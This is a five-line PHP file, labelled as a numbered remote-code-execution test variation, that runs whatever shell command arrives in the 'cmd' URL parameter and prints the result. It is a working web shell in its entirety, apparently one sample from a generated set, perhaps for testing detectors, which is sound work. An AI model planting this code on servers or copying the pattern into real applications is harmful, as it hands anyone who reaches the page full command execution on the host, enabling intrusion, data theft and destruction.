<?php
// RCE test variation #723
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>